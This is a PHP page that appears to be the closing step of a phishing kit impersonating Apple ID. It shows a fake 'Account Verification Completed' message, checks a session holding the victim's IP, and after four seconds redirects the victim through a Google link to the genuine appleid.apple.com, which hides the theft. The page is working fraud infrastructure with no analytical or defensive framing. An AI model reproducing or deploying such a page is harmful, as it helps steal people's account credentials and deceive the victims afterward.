<?php 
    @error_reporting(0);
    session_start();
    if ( !isset( $_SESSION['ip'] ) ) {
        header("Location: login.php");
    }
    require "partials/enc.php";
?>
<?php include 'partials/header.php'; ?>
<div id="content">
    <div class="extra-container">

        <?php include 'partials/nav.php'; ?>

        <div id="flow">
            <div class="flow-body signin clearfix" role="main">

                <?php include 'partials/head.php'; ?>

                <div class="container">
                    <div class="flex home-content">
                        <div class="container flow-sections">
                            <div class="account-wrapper">
                                <div align="center">
                                    <h1>Account Verification Completed</h1>
                                    <img id="spinner" src="assets/img/verified.png" height="100" width="100">
                                    <p>Please wait while we restore your account access...</p>
                                    <p style="text-decoration:underline;color:red;">For your security you will automatically be logged out. 
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <script type="text/javascript">
                $('title').text('Completed');
                window.setTimeout(function() {
                    window.location = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwif2danlf3WAhVFXhoKHbPoCdkQFggnMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AOvVaw3iD44RKYxGFrDmcgitzSAs";
                },4000);
            </script>
<?php include 'partials/footer.php'; ?>
